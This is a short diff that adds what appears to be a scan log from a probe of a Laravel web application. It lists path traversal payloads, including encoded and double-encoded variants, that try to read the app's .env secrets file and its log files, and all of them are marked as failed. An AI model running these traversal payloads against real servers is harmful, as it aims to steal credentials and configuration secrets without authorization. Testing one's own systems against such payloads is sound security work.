@@ -1,0 +1,20 @@
+[*] 尝试读取Laravel .env文件...
+
+  /.env → ❌
+  /../.env → ❌
+  /../../.env → ❌
+  /../../../.env → ❌
+  /storage/../.env → ❌
+  /storage/../../.env → ❌
+  /api/../.env → ❌
+  /..;/.env → ❌
+  /%2e%2e/.env → ❌
+  /%2e%2e%2f.env → ❌
+  /..%2f.env → ❌
+  /..%252f.env → ❌
+  /storage../.env → ❌
+  /storage/logs/../../.env → ❌
+
+[*] 尝试读取Laravel日志...
+  /storage/logs/laravel.log → ❌
+  /storage/logs/laravel-2025-11-14.log → ❌
